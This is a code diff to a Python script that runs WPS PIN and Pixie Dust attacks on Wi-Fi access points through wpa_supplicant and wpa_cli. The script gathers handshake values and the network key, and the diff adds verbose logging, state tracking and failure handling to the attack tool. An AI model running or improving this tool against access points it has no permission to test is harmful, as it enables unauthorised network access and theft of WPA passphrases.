@@ -9,6 +9,7 @@ class Data():
 		self.authkey = ''
 		self.e_nonce = ''
 		self.wpa_psk = ''
+		self.state = ''
 
 class Options():
 	def __init__(self):
@@ -16,6 +17,7 @@ class Options():
 		self.bssid = None
 		self.pin = None
 		self.pixiemode = False
+		self.verbose = False
 
 def shellcmd(cmd):
 	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
@@ -26,7 +28,7 @@ def shellcmd(cmd):
 def run_wpa_supplicant(options):
 	options.tempdir = tempfile.mkdtemp()
 	with tempfile.NamedTemporaryFile(suffix='.conf', delete=False) as temp:
-		temp.write("ctrl_interface=%s\nctrl_interface_group=root\nupdate_config=1\n"%options.tempdir)
+		temp.write("ctrl_interface=%s\nctrl_interface_group=root\nupdate_config=1\n"%(options.tempdir))
 		options.tempconf=temp.name
 	cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i%s -c%s'%(options.interface, options.tempconf)
 	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -48,6 +50,11 @@ def recvuntil(pipe, what):
 def got_all_pixie_data(data):
 	return data.pke and data.pkr and data.e_nonce and data.authkey and data.e_hash1 and data.e_hash2
 
+def statechange(data, old, new):
+	print '%s -> %s'%(old, new)
+	data.state = new
+	return True
+
 def process_wpa_supplicant(pipe, options, data):
 	def get_hex(line):
 		a = line.split(':', 3)
@@ -59,7 +66,7 @@ def process_wpa_supplicant(pipe, options, data):
 		return False
 	line = line.rstrip('\n')
 
-	print line
+	if options.verbose: sys.stderr.write(line + '\n')
 
 	if line.startswith('WPS: '):
 		if 'Enrollee Nonce' in line and 'hexdump' in line:
@@ -82,6 +89,22 @@ def process_wpa_supplicant(pipe, options, data):
 			assert(len(data.e_hash2) == 32*2)
 		elif 'Network Key' in line and 'hexdump' in line:
 			data.wpa_psk = get_hex(line).decode('hex')
+		elif 'Building Message M' in line:
+			statechange(data, data.state, 'M' + line.split('Building Message M')[1])
+		elif 'Received M' in line:
+			statechange(data, data.state, 'M' + line.split('Received M')[1])
+
+	elif ': State: ' in line:
+		statechange(data, *line.split(': State: ')[1].split(' -> '))
+	elif 'WPS-FAIL' in line:
+		print "WPS-FAIL :("
+		return False
+
+	elif 'NL80211_CMD_DEL_STATION' in line:
+		#if data.state == 'ASSOCIATED':
+		#	print "URGH"
+		print "[ERROR]: unexpected interference - kill NetworkManager/wpa_supplicant!"
+		#return False
 	elif 'Trying to authenticate with' in line:
 		print line
 	elif 'Authentication response' in line:
@@ -91,8 +114,6 @@ def process_wpa_supplicant(pipe, options, data):
 	elif 'Associated with' in line:
 		print line
 	elif 'EAPOL: txStart' in line:
-		print line
-	elif 'Received M' in line:
 		print line
 
 	return True
@@ -113,6 +134,7 @@ Required Arguments:
 Optional Arguments:
 	-p, --pin=<wps pin>      Use the specified pin (arbitrary string or 4/8 digit pin)
 	-K, --pixie-dust         Run pixiedust attack
+	-v                       Verbose output
 
 Example:
 	%s -i wlan0 -b 00:90:4C:C1:AC:21 -p 12345670 -K
@@ -130,12 +152,13 @@ if __name__ == '__main__':
 	options = Options()
 
 	import getopt
-	optlist, args = getopt.getopt(sys.argv[1:], ":i:b:p:K", ["help", "interface", "bssid", "pin", "pixie-dust"])
+	optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:Kv", ["help", "interface", "bssid", "pin", "pixie-dust"])
 	for a,b in optlist:
 		if   a in ('-i', "--interface"): options.interface = b
 		elif a in ('-b', "--bssid"): options.bssid = b
 		elif a in ('-p', "--pin"): options.pin = b
 		elif a in ('-K', "--pixie-dust"): options.pixiemode = True
+		elif a in ('-v'): options.verbose = True
 		elif a == '--help': usage()
 	if not options.interface or not options.bssid:
 		die("missing required argument! (use --help for usage)")
@@ -154,6 +177,8 @@ if __name__ == '__main__':
 	wpac = run_wpa_cli(options)
 	recvuntil(wpac, '\n> ')
 	wpac.stdin.write('wps_reg %s %s\n' % (options.bssid, options.pin))
+#	while True:
+#		sys.stderr.write( wpac.stdout.read(1) )
 	recvuntil(wpac, 'OK')
 
 	while True:
